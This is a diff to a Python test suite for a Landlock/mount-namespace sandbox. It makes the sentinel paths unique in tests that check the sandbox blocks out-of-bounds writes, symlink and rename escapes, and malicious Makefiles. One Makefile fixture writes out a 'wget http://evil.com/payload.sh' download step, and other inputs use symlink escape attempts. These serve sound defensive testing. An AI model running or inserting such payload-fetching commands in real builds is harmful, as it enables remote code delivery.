@@ -26,10 +26,11 @@ pytestmark = [
 # E402 accepted (placement is stylistic; import side effects run
 # regardless of position).
 import os  # noqa: E402
+import shutil  # noqa: E402
 import subprocess  # noqa: E402
 import unittest  # noqa: E402
 from pathlib import Path  # noqa: E402
-from tempfile import TemporaryDirectory  # noqa: E402
+from tempfile import TemporaryDirectory, mkdtemp  # noqa: E402
 
 from core.sandbox import (  # noqa: E402
     check_landlock_available,
@@ -128,8 +129,13 @@ class TestE2ELandlockWriteBlocking(unittest.TestCase):
     def test_write_to_var_blocked(self):
         """Writing to /var/tmp is blocked — either by Landlock (EACCES) or
         by mount-ns (path doesn't exist in the sandbox root)."""
-        sentinel = "/var/tmp/raptor_sandbox_test"
-        self._cleanup_paths.append(sentinel)
+        # A unique dir under /var/tmp: outside every sandbox grant like a
+        # fixed name, but collision-free on hosts shared between runs.
+        # (/tmp can't host the sentinel — it is writable by design in the
+        # sandbox and masked by tmpfs under mount-ns.)
+        outside = mkdtemp(dir="/var/tmp", prefix="raptor_sandbox_test_")
+        self.addCleanup(shutil.rmtree, outside, ignore_errors=True)
+        sentinel = f"{outside}/sentinel"
         with TemporaryDirectory() as target, TemporaryDirectory() as output:
             result = sandbox_run(
                 ["sh", "-c", f"echo evil > {sentinel} 2>&1"],
@@ -202,9 +208,15 @@ class TestE2ELandlockWriteBlocking(unittest.TestCase):
 
     def test_write_to_tmp_allowed(self):
         """Writing to /tmp succeeds."""
+        # Unique name: under Landlock-only the write lands on the shared
+        # host /tmp, where a fixed name would race a concurrent run and
+        # leave litter (tearDown unlinks it there; mount-ns discards it
+        # with the private tmpfs).
+        probe = f"/tmp/raptor_sandbox_test_{os.getpid()}"
+        self._cleanup_paths.append(probe)
         with TemporaryDirectory() as target, TemporaryDirectory() as output:
             result = sandbox_run(
-                ["sh", "-c", "echo ok > /tmp/raptor_sandbox_test && cat /tmp/raptor_sandbox_test"],
+                ["sh", "-c", f"echo ok > {probe} && cat {probe}"],
                 target=target, output=output,
                 capture_output=True, text=True, timeout=5,
             )
@@ -213,12 +225,13 @@ class TestE2ELandlockWriteBlocking(unittest.TestCase):
 
     def test_symlink_attack_blocked(self):
         """Symlink pointing outside allowed paths — write blocked."""
-        sentinel = "/var/tmp/raptor_test"
-        self._cleanup_paths.append(sentinel)
+        outside = mkdtemp(dir="/var/tmp", prefix="raptor_test_")
+        self.addCleanup(shutil.rmtree, outside, ignore_errors=True)
+        sentinel = f"{outside}/raptor_test"
         with TemporaryDirectory() as target, TemporaryDirectory() as output:
-            # Create a symlink inside output pointing to /var/tmp
+            # Create a symlink inside output pointing outside every grant
             evil_link = Path(output) / "escape"
-            evil_link.symlink_to("/var/tmp")
+            evil_link.symlink_to(outside)
             sandbox_run(
                 ["sh", "-c", f"echo pwned > {output}/escape/raptor_test 2>&1"],
                 target=target, output=output,
@@ -232,8 +245,9 @@ class TestE2ELandlockWriteBlocking(unittest.TestCase):
         import core.sandbox as mod
         if mod._get_landlock_abi() < 2:
             self.skipTest("Landlock REFER requires ABI v2 (kernel 5.19+)")
-        sentinel = "/var/tmp/raptor_rename_test"
-        self._cleanup_paths.append(sentinel)
+        outside = mkdtemp(dir="/var/tmp", prefix="raptor_rename_test_")
+        self.addCleanup(shutil.rmtree, outside, ignore_errors=True)
+        sentinel = f"{outside}/renamed"
         with TemporaryDirectory() as target, TemporaryDirectory() as output:
             victim = Path(output) / "source.txt"
             victim.write_text("hello")
@@ -1998,9 +2012,14 @@ class TestE2EMaliciousMakefile(unittest.TestCase):
         """A Makefile with wget | bash has network blocked."""
         with TemporaryDirectory() as d:
             makefile = Path(d) / "Makefile"
+            # Write wget's output inside this test's own tempdir: a fixed
+            # host path like /tmp/payload.sh is only masked by tmpfs on
+            # the mount-ns backend — on Landlock-only the file lands on
+            # the shared host /tmp, where a pre-existing unrelated file
+            # would fail the size assertion and get deleted below.
             makefile.write_text(
                 "all:\n"
-                "\twget -q http://evil.com/payload.sh -O /tmp/payload.sh 2>&1 || echo wget_failed\n"
+                f"\twget -q http://evil.com/payload.sh -O {d}/payload.sh 2>&1 || echo wget_failed\n"
                 "\techo build_done\n"
             )
             result = sandbox_run(
@@ -2012,10 +2031,9 @@ class TestE2EMaliciousMakefile(unittest.TestCase):
             combined = result.stdout + result.stderr
             self.assertIn("wget_failed", combined)
             # wget creates the output file but can't download — verify empty (no payload)
-            payload = Path("/tmp/payload.sh")
+            payload = Path(d) / "payload.sh"
             if payload.exists():
                 self.assertEqual(payload.stat().st_size, 0, "payload.sh should be empty")
-                payload.unlink()
 
     def test_curl_exfil_blocked(self):
         """A Makefile trying to curl data out is blocked."""
